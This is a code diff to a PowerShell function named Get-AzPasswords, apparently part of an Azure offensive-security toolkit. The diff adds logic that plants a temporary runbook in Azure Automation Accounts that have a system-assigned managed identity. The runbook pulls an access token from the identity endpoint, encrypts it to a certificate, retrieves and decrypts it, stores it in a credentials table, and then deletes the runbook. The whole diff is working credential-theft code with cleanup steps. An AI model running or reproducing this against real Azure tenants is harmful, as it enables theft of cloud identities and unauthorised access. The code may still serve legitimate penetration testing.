@@ -601,7 +601,34 @@ Function Get-AzPasswords
 
                     $jobList2 += @($jobName2)
                 }
-            }                               
+            }
+            
+            #Assume there's no MI
+            $dumpMI = $false
+            #Need to fetch via the REST endpoint to check if there's an identity
+            $mgmtToken = (Get-AzAccessToken -ResourceUrl "https://management.azure.com").Token
+            $accountDetails = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "?api-version=2015-10-31")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
+            if($accountDetails.identity.type -eq "systemassigned"){
+                
+                $dumpMI = $true
+                $dumpMiJobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
+                # Copy the B64 encryption cert to the Automation Account host
+                "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1"
+                "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                #Request a token from the IMDS
+                "`$resource= `"?resource=https://management.azure.com/`"" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                "`$url = `$env:IDENTITY_ENDPOINT + `$resource " | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                "`$Headers = New-Object `"System.Collections.Generic.Dictionary[[String],[String]]`" " | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                "`$Headers.Add(`"X-IDENTITY-HEADER`", `$env:IDENTITY_HEADER) " | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                "`$Headers.Add(`"Metadata`", `"True`") " | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                "`$accessToken = Invoke-RestMethod -Uri `$url -Method 'GET' -Headers `$Headers" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                # Encrypt the token in the Automation account output
+                "`$encryptedOut1 = (`$accessToken.access_token | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                "write-output `$encryptedOut1" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
+                
+               
+            }                             
 
 #============================== End Automation Script Creation ==============================#
 
@@ -724,7 +751,42 @@ Function Get-AzPasswords
                 }
             }
 
-        }
+            #If there's an identity then dump it
+            if($dumpMi -eq $true){
+                Write-Verbose "`tGetting a token for the $verboseName Automation Account using the $dumpMiJobName.ps1 runbook"
+                try{
+                    Import-AzAutomationRunbook -Path ".\$dumpMiJobName.ps1" -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $dumpMiJobName | Out-Null
+                    Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $dumpMiJobName | Out-Null
+    
+                    $jobID = Start-AzAutomationRunbook -Name $dumpMiJobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
+                    $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                    # Wait for the job to complete
+                    Write-Verbose "`t`tWaiting for the automation job to complete"
+                    while($jobstatus.Status -ne "Completed"){
+                        $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                    }    
+                    try{
+                        $jobOutput = Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value
+                        Write-Verbose "`t`t`tRetrieved system assigned identity token for the $verboseName account"
+                        $tokenDecrypted = $jobOutput.Values | Unprotect-CmsMessage
+                        # Add creds to the table
+                        $TempTblCreds.Rows.Add("Automation Account System Assigned Managed Identity",$AutoAccount.AutomationAccountName,"N/A",$tokenDecrypted,"N/A","N/A","N/A","N/A","Token","N/A",$subName) | Out-Null
+                    }
+                    catch{}
+
+                    #clean up
+                    Write-Verbose "`t`tRemoving $dumpMiJobName runbook from $verboseName AutomationAccount"
+                    Remove-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $dumpMiJobName -ResourceGroupName $AutoAccount.ResourceGroupName -Force
+                }
+                catch{Write-Verbose "`tUser does not have permissions to import Runbook"}
+
+                # Clean up local temp files
+                Remove-Item -Path $pwd\$dumpMiJobName.ps1 | Out-Null
+            }
+
+
+        
+    }
 
         # Remove the encryption cert from the system
         Remove-Item .\microburst.cer
@@ -865,6 +927,5 @@ Function Get-AzPasswords
     # Output Creds
     Write-Output $TempTblCreds
 }
-
 
 
